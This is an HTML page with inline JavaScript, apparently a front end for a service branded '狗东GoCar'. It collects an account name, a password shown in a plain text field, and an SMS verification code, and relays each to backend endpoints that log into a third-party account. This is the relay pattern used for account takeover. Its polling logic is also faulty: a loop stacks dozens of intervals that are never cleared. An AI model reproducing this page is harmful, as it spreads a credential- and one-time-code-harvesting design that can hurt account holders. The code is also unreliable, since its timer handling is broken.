<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Responsive Form with Bootstrap and JavaScript</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body {
            background-color: #f8f9fa;
        }

        .form-container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        .dialog-content {
            padding: 20px;
        }

        dialog {
            border: none;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .countdown-timer {
            margin-left: 10px;
            font-weight: bold;
        }
        #uid-display {
            font-size: 0.8rem; /* Smaller font size */
            word-break: break-word; /* Ensure long text breaks */
        }
    </style>
</head>

<body>
    <div class="container">
        <h1 class="text-center mt-5 mb-4">狗东GoCar</h1>

        <div class="form-container">
            <div class="form-group">
                <label for="input1">账号</label>
                <input type="text" class="form-control" id="input1" name="input1" required />
            </div>

            <div class="form-group">
                <label for="input2">密码</label>
                <input type="text" class="form-control" id="input2" name="input2" required />
            </div>

            <button id="submit-button" type="submit" class="btn btn-primary btn-block" onclick="sub()">
                提交
                <span id="countdown-timer" class="countdown-timer"></span>
            </button>
            <div id="uid-display" class="mt-3"></div>
        </div>
    </div>

    <dialog id="sms-dialog">
        <div class="dialog-content">
            <h5>本次登录需要验证码，请输入短信验证码</h5>
            <input type="text" id="sms-code" class="form-control mb-3" placeholder="验证码" required />
            <button class="btn btn-primary" onclick="submitSmsCode()">
                提交验证码
            </button>
            <button class="btn btn-secondary" onclick="closeDialog()">取消</button>
        </div>
    </dialog>

    <script>
        let waitTime = 60;
        let uid = "";
        let countdownInterval;
        let isLoginFlag = false; // 新增标志位
        let isSmsFlag = false;
        let checkInterval;
        async function sub() {
            const input1 = document.getElementById("input1").value;
            const input2 = document.getElementById("input2").value;
            const submitButton = document.getElementById("submit-button");

            if (input1 && input2) {
                await loginApi(input1, input2);
                if (uid) {
                    startCountdown(waitTime);
                    submitButton.disabled = true
                    //防止死锁
                    document.getElementById("uid-display").textContent = `${uid}`;
                    await new Promise(resolve => setTimeout(resolve, 5 * 1000));
                    for (let i = 0; i < waitTime; i++) {
                        //减少请求频率
                        await new Promise(resolve => setTimeout(resolve, 2 * 1000));
                        checkInterval = setInterval(async () => {
                            if (!isLoginFlag && !isSmsFlag) {
                                await check(uid);
                            }
                        }, 2 * 1000); // 每2秒检查一次
                    }
                }
            } else {
                alert("请输入账号和密码");
            }
        }

        function startCountdown(seconds) {
            const countdownTimer = document.getElementById("countdown-timer");
            countdownTimer.textContent = `(${seconds}s)`;
            countdownInterval = setInterval(() => {
                seconds--;
                countdownTimer.textContent = `(${seconds}s)`;
                if (seconds <= 0) {
                    clearInterval(countdownInterval);
                    countdownTimer.textContent = '';
                    document.getElementById("submit-button").disabled = false;
                }
            }, 1000);
        }

        async function loginApi(id, pw) {
            id = id + "";
            pw = pw + "";
            try {
                const response = await fetch("/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        id,
                        pw,
                    }),
                });
                if (response.ok) {
                    const result = await response.json();
                    if (result.status === "pass") {
                        uid = result.uid;
                        alert("提交成功");
                    } else {
                        alert(result.message);
                    }
                } else {
                    console.error("Error:", response);
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }

        async function check(uid) {
            uid = uid + "";
            try {
                const response = await fetch("/check", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        uid,
                    }),
                });
                if (response.ok) {
                    const result = await response.json();
                    if (result.status === "pass") {
                        isLoginFlag = true;
                        clearInterval(checkInterval); // 登录成功时清除检查循环
                        alert("登录成功");
                    }
                    if (result.status === "pending") {
                    }
                    if (result.status === "error") {
                    }
                    if (result.status === "wrongSMS") {
                        alert("验证码错误");
                    }
                    if (result.status === "SMS") {
                        isSmsFlag = true;
                        openDialog();
                    }
                } else {
                    console.error("Error:", response);
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }

        async function submitSmsCode() {
            const code = document.getElementById("sms-code").value;
            if (uid) {
                if (code) {
                    await smsApi(uid, code);
                    isSmsFlag = false; // 验证码验证完成后设置为false
                    checkInterval = setInterval(async () => {
                        if (!isLoginFlag && !isSmsFlag) {
                            await check(uid);
                        }
                    }, 2 * 1000); // 每2秒检查一次
                } else {
                    alert("请输入验证码");
                }
            }
        }

        async function smsApi(uid, code) {
            uid = uid + "";
            code = code + "";
            try {
                const response = await fetch("/sms", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        uid,
                        code,
                    }),
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.status === "pass") {
                        alert("提交验证码成功");
                    } else if (result.status === "wrongSMS") {
                        alert("验证码错误");
                    }
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }

        function openDialog() {
            const dialog = document.getElementById("sms-dialog");
            dialog.showModal();
        }

        function closeDialog() {
            const dialog = document.getElementById("sms-dialog");
            dialog.close();
        }
    </script>
</body>

</html>
